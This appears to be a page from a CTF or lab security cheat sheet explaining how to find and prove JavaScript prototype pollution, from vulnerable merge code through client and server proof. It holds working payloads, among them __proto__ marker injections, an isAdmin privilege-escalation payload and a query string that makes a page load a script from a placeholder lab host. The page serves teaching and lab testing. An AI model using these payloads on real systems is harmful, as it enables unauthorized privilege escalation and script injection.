---
title: "Prototype Pollution · Source to Gadget"
weight: 50
bookToc: true
---

# JavaScript prototype pollution

**Pollution source → inherited property proof → reachable gadget → visible effect.** An object containing a key named `__proto__` is not by itself proof that any prototype changed.

## 1. Where to look

Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for `merge`, `defaultsDeep`, `set`, `parse`, `Object.assign` and recursive property copying. Inspect dependency versions when source is provided.

Vulnerable shape to recognize:

```javascript
for (const key in input) {
  if (typeof input[key] === 'object') merge(target[key], input[key]);
  else target[key] = input[key];
}
```

Exact behavior depends on initialization, own-property checks and recursion. Some merges affect only one object's prototype; others reach the shared `Object.prototype`.

## 2. Non-destructive marker first

JSON import/merge candidate:

```http
POST /api/settings HTTP/1.1
Host: ctf.invalid
Content-Type: application/json

{"__proto__":{"ctfMarker731":"present"}}
```

Alternative path for a setter/merge that permits constructor traversal:

```json
{"constructor":{"prototype":{"ctfMarker731":"present"}}}
```

Query parser candidates, only if the parser accepts nested paths:

```text
?__proto__[ctfMarker731]=present
?__proto__.ctfMarker731=present
?constructor[prototype][ctfMarker731]=present
?constructor.prototype.ctfMarker731=present
```

These are different parser dialects. URL encode the brackets if transport requires it; do not assume dotted names are nested when the app uses a flat parser.

## 3. Client-side proof

After triggering the application's vulnerable operation, inspect from the same page's console:

```javascript
({}).ctfMarker731
Object.prototype.hasOwnProperty.call({}, 'ctfMarker731')
Object.prototype.hasOwnProperty.call(Object.prototype, 'ctfMarker731')
```

Expected for shared prototype pollution: `"present"`, `false`, `true`. A fresh ordinary object inherits the marker without owning it. If only the imported object has the key as its own property, that is data storage, not shared prototype pollution.

JavaScript literal trap:

```javascript
const a = {"__proto__": {ctfMarker731:'present'}};
const b = JSON.parse('{"__proto__":{"ctfMarker731":"present"}}');
```

Object-literal `__proto__` syntax can set **a's** prototype directly. JSON parsing creates an ordinary own key; dangerous merging later may invoke prototype behavior. Neither statement alone pollutes all ordinary objects. Modern object spread and `Object.assign` also differ in setter behavior.

## 4. Server-side proof needs observable application behavior

Your browser's `({}).ctfMarker731` cannot inspect a Node server's prototype. Use source-assisted inspection or an endpoint returning properties derived from a **fresh server-created object**. A response echoing your submitted JSON is insufficient.

In a supplied local source tree, check in a debugger after the merge:

```javascript
({}).ctfMarker731
```

Without source, first identify a read of an inherited property that affects a harmless observable value. Avoid global destructive probes such as replacing `toString`, huge JSON indentation, invalid status codes or memory-consuming keys: process-wide state may persist across users and requests.

## 5. Authorization gadget

A vulnerable authorization read might look like:

```javascript
if (user.isAdmin) return flag;
```

Candidate only after a pollution source is proven:

```json
{"__proto__":{"isAdmin":true}}
```

Then request the protected resource in the same server instance/session. This fails if `user` has its own `isAdmin:false`, uses a null prototype, or the code checks an own property / database role. Own properties shadow inherited values. A JSON response showing `isAdmin:true` does not prove the authorization decision changed.

## 6. Client DOM gadget

Example source to recognize:

```javascript
const config = {};
if (config.transport_url) {
  const s = document.createElement('script');
  s.src = config.transport_url;
  document.head.appendChild(s);
}
```

If `transport_url` is read from a polluted prototype, this application may load a script from a supplied permitted host:

```text
?__proto__[transport_url]=https://YOUR-LAB-HOST/proof.js
```

The property name must match a real gadget. A script URL must be usable under CSP and fetched at the correct point in the lifecycle. URL parsing may consume the pollution only after gadget initialization; refresh/reorder the flow when source supports it.

## 7. Server execution chains are runtime-specific

Node subprocess options, template compiler options and module-loading configuration can become gadgets in specific versions. Merely setting `shell`, `NODE_OPTIONS` or `execArgv` on a prototype does not establish execution.

Record all prerequisites before attempting a chain:

```text
Pollution function and dependency version:
Shared or per-object prototype:
Property read and whether own value shadows it:
Actual child_process/template/loader call:
Node and library version:
Options object construction:
Observable proof:
```

A child process must actually be started, with an options object that inherits the relevant property. API defaults and hardened option handling change between Node versions. Use provided source/version rather than copying a historical RCE chain.

## 8. Troubleshooting

| Observation | Next check |
| --- | --- |
| Key reflected, fresh object unchanged | Stored own property; no pollution proof |
| `__proto__` rejected | Look for constructor path only if setter can traverse it |
| Marker works only on one object | Per-object prototype change |
| Marker works, privilege does not | Gadget absent, own property shadows, null-prototype object |
| First request works, later requests weird | Process-wide state persisted; reset your local instance |
| Browser clean, server affected | Separate JavaScript runtimes |
| Server restart loses effect | Expected in-memory mutation |

Remove the test marker from your local runtime after recording evidence:

```javascript
delete Object.prototype.ctfMarker731;
```

That cleanup only affects the current runtime. It cannot remotely reset a shared server. Related: [XSS](../xss/), [Auth / IDOR](../auth-idor/).

## Tool workflow

Use [Burp Community Repeater](../../ajcbbc_allow_tools/burp_suite_community/) for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.

## References

[MDN prototype pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution), [PortSwigger prototype pollution](https://portswigger.net/web-security/prototype-pollution), [Node child_process API](https://nodejs.org/api/child_process.html).
